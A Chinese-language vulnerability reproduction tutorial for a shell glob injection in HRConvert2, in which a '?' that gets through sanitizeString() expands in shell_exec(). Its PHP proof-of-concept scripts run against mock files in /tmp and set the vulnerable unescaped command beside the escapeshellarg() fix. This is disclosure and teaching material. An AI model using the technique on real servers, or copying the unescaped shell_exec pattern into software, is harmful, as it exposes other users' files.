# HRConvert2 Shell Glob Injection — 本地复现教程

## 前提条件

你只需要一台装了 **PHP** 的机器（Linux/macOS/WSL）。不需要安装 HRConvert2、Apache 或任何其他依赖。

检查 PHP 是否安装：
```bash
php -v
```

如果没装：
- Ubuntu/Debian: `sudo apt install php-cli`
- macOS: `brew install php`
- Windows: 用 WSL 或装 XAMPP

---

## 原理速览

```
HRConvert2 的 sanitizeString() 过滤了大量字符，但漏掉了 ?
↓
? 在 bash 中是 glob 通配符（匹配任意单个字符）
↓
shell_exec('convert ... /path/file?.jpg ...') 
↓
bash 自动展开为: /path/fileA.jpg /path/fileB.jpg /path/fileC.jpg ...
↓
ImageMagick/ClamAV/ffmpeg 处理了非预期的文件
```

---

## 第一步：创建测试目录

```bash
mkdir -p /tmp/hrconvert2_poc
cd /tmp/hrconvert2_poc
```

---

## 第二步：创建模拟文件

模拟 HRConvert2 的 ConvertDir 中有多个用户文件：

```bash
# 模拟其他"正常"文件（可能是别人的或敏感的）
echo "SECRET_DATA_1" > fileA.txt
echo "SECRET_DATA_2" > fileB.txt
echo "SECRET_DATA_3" > fileC.txt

# 攻击者上传的文件（文件名含 ? 通配符）
echo "attacker_dummy_content" > "file?.txt"
```

验证文件都存在：
```bash
ls -la /tmp/hrconvert2_poc/
```

你应该看到：
```
fileA.txt
fileB.txt
fileC.txt
file?.txt
```

---

## 第三步：验证 ? 通过 sanitizeString()

创建文件 `test_sanitize.php`：

```bash
cat > /tmp/hrconvert2_poc/test_sanitize.php << 'EOF'
<?php
// 这是 HRConvert2 convertCore.php 中的原始 sanitizeString 函数（一字不改）
function sanitizeString($Variable, $strict) {
  if ($strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  if (!$strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\[](){};"\''.'`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  return $Variable;
}

$input = 'file?.txt';
$output = sanitizeString($input, TRUE);  // TRUE = strict 模式

echo "输入文件名: $input\n";
echo "sanitizeString(strict) 输出: $output\n";
echo "? 字符是否存活: " . (strpos($output, '?') !== false ? "是 ✓ (漏洞确认)" : "否 ✗") . "\n";
EOF
```

运行：
```bash
php /tmp/hrconvert2_poc/test_sanitize.php
```

**预期输出：**
```
输入文件名: file?.txt
sanitizeString(strict) 输出: file?.txt
? 字符是否存活: 是 ✓ (漏洞确认)
```

---

## 第四步：演示 Shell Glob 展开（核心 PoC）

```bash
cat > /tmp/hrconvert2_poc/test_glob.php << 'EOF'
<?php
/**
 * 模拟 HRConvert2 的 shell_exec() 调用
 * 对比有无 escapeshellarg() 的区别
 */

$ConvertDir = '/tmp/hrconvert2_poc/';
$file = 'file?.txt';  // 经过 sanitizeString 后的文件名（? 存活）

echo "=== 模拟 HRConvert2 shell_exec() 行为 ===\n\n";

// ---------- 漏洞代码（HRConvert2 的做法）----------
echo "[漏洞] HRConvert2 实际执行的命令:\n";
$vulnerable_cmd = 'cat ' . $ConvertDir . $file;
echo "  $vulnerable_cmd\n\n";

echo "[漏洞] bash glob 展开后实际读取了:\n";
$result = shell_exec('echo ' . $ConvertDir . $file);
echo "  $result\n";

echo "[漏洞] cat 的输出（读到了所有匹配文件的内容）:\n";
$output = shell_exec($vulnerable_cmd . ' 2>/dev/null');
echo "  " . str_replace("\n", "\n  ", trim($output)) . "\n\n";

// ---------- 正确做法 ----------
echo "[安全] 使用 escapeshellarg() 后:\n";
$safe_cmd = 'cat ' . escapeshellarg($ConvertDir . $file);
echo "  $safe_cmd\n\n";

echo "[安全] 只读取字面文件 file?.txt:\n";
$output = shell_exec($safe_cmd . ' 2>/dev/null');
echo "  " . str_replace("\n", "\n  ", trim($output)) . "\n";
EOF
```

运行：
```bash
php /tmp/hrconvert2_poc/test_glob.php
```

**预期输出：**
```
=== 模拟 HRConvert2 shell_exec() 行为 ===

[漏洞] HRConvert2 实际执行的命令:
  cat /tmp/hrconvert2_poc/file?.txt

[漏洞] bash glob 展开后实际读取了:
  /tmp/hrconvert2_poc/fileA.txt /tmp/hrconvert2_poc/fileB.txt /tmp/hrconvert2_poc/fileC.txt /tmp/hrconvert2_poc/file?.txt

[漏洞] cat 的输出（读到了所有匹配文件的内容）:
  SECRET_DATA_1
  SECRET_DATA_2
  SECRET_DATA_3
  attacker_dummy_content

[安全] 使用 escapeshellarg() 后:
  cat '/tmp/hrconvert2_poc/file?.txt'

[安全] 只读取字面文件 file?.txt:
  attacker_dummy_content
```

---

## 第五步：模拟真实 HRConvert2 攻击链

```bash
cat > /tmp/hrconvert2_poc/full_poc.php << 'EOF'
<?php
/**
 * 完整攻击链模拟：
 * 1. 用户上传 file?.jpg
 * 2. sanitizeString() 不过滤 ?
 * 3. verifyFile() 的 file_exists() 通过（PHP 不 glob）
 * 4. shell_exec() 中 bash glob 展开
 */

function sanitizeString($Variable, $strict) {
  if ($strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  return $Variable;
}

echo "╔══════════════════════════════════════════════════════╗\n";
echo "║  HRConvert2 Shell Glob Injection — 完整攻击链 PoC  ║\n";
echo "╚══════════════════════════════════════════════════════╝\n\n";

// --- 模拟环境 ---
$ConvertDir = '/tmp/hrconvert2_poc/convert/';
$ConvertTempDir = '/tmp/hrconvert2_poc/temp/';
@mkdir($ConvertDir, 0777, true);
@mkdir($ConvertTempDir, 0777, true);

// 模拟其他用户的文件已在同目录
file_put_contents($ConvertTempDir . 'img1.jpg', 'VICTIM_IMAGE_DATA_1');
file_put_contents($ConvertTempDir . 'img2.jpg', 'VICTIM_IMAGE_DATA_2');
file_put_contents($ConvertTempDir . 'img3.jpg', 'VICTIM_IMAGE_DATA_3');

echo "【环境准备】目录中已有的文件:\n";
foreach (glob($ConvertTempDir . '*.jpg') as $f) echo "  " . basename($f) . "\n";
echo "\n";

// ========== 步骤 1: 攻击者上传文件 ==========
echo "【步骤1】攻击者上传文件名为 'img?.jpg' 的文件\n";
$uploadedFilename = 'img?.jpg';

// 模拟 uploadFiles() 中的处理
$sanitizedFilename = sanitizeString($uploadedFilename, TRUE);
echo "  原始文件名: $uploadedFilename\n";
echo "  sanitizeString(strict): $sanitizedFilename\n";
echo "  ? 存活: " . (strpos($sanitizedFilename, '?') !== false ? "是 ✓" : "否 ✗") . "\n";

// 文件存储到磁盘
$storedPath = $ConvertTempDir . $sanitizedFilename;
file_put_contents($storedPath, 'ATTACKER_DUMMY_DATA');
echo "  文件存储到: $storedPath\n\n";

// ========== 步骤 2: 模拟 verifyFile() ==========
echo "【步骤2】verifyFile() 验证文件\n";
$pathname = $ConvertTempDir . $sanitizedFilename;
$exists = file_exists($pathname);
echo "  file_exists('$pathname'): " . ($exists ? "true ✓ (PHP不做glob)" : "false") . "\n";
echo "  验证通过！\n\n";

// ========== 步骤 3: 模拟 shell_exec() ==========
echo "【步骤3】执行 shell_exec() — 模拟 convertImages()\n\n";

// HRConvert2 的实际代码 (convertCore.php line 902):
// $returnData = shell_exec('convert -background none '.$wh.$rotate.' '.$pathname.' '.$newPathname);
$newPathname = $ConvertDir . 'output.png';
$command = 'echo EXECUTING: convert -background none ' . $pathname . ' ' . $newPathname;

echo "  命令: convert -background none $pathname $newPathname\n\n";

// 展示 bash 如何展开
$expanded = trim(shell_exec('echo ' . $pathname));
echo "  Bash glob 展开后的实际路径:\n";
foreach (explode(' ', $expanded) as $p) {
    $marker = (basename($p) === 'img?.jpg') ? ' ← 攻击者的文件' : ' ← 非预期匹配！';
    echo "    $p$marker\n";
}
echo "\n";

$matchCount = count(explode(' ', $expanded));
echo "  ⚠️  本来只应处理 1 个文件，实际匹配了 $matchCount 个文件！\n\n";

// ========== 步骤 4: 对比修复后 ==========
echo "【步骤4】修复后的对比 (使用 escapeshellarg)\n\n";
$safe_command = 'echo ' . escapeshellarg($pathname);
$safe_expanded = trim(shell_exec($safe_command));
echo "  安全命令: convert -background none " . escapeshellarg($pathname) . " " . escapeshellarg($newPathname) . "\n";
echo "  实际路径: $safe_expanded\n";
echo "  ✓ 只处理字面文件，没有 glob 展开\n\n";

// ========== 总结 ==========
echo "╔══════════════════════════════════════════════════════╗\n";
echo "║  结论                                               ║\n";
echo "╠══════════════════════════════════════════════════════╣\n";
echo "║  ? 字符通过 sanitizeString() → bash glob 展开      ║\n";
echo "║  攻击者可让服务器处理同目录下的非预期文件          ║\n";
echo "║  修复: 使用 escapeshellarg() 包裹所有变量          ║\n";
echo "╚══════════════════════════════════════════════════════╝\n";

// 清理
exec('rm -rf /tmp/hrconvert2_poc/convert /tmp/hrconvert2_poc/temp');
EOF
```

运行：
```bash
php /tmp/hrconvert2_poc/full_poc.php
```

---

## 第六步：清理

```bash
rm -rf /tmp/hrconvert2_poc
```

---

## 常见问题

**Q: 为什么 file_exists() 不会 glob？**

A: PHP 的 `file_exists()` 是精确匹配，不做通配符展开。所以文件名中含 `?` 的字面文件可以通过这个检查。但当同一个字符串被传入 `shell_exec()` 时，bash 会把 `?` 当做 glob 模式展开。

**Q: 这个漏洞的实际危害是什么？**

A: 当前版本中，文件按 session hash 隔离在不同目录，所以主要影响是：
- 处理同一 session 目录中的非预期文件（如多文件上传场景）
- 如果部署配置不当导致多用户共享目录，则可能造成信息泄露
- 架构风险：证明 sanitization 存在盲区

**Q: 我需要部署完整的 HRConvert2 来测试吗？**

A: 不需要。这个 PoC 直接提取了核心的 `sanitizeString()` 函数并模拟了 `shell_exec()` 的行为。效果和真实环境一致。
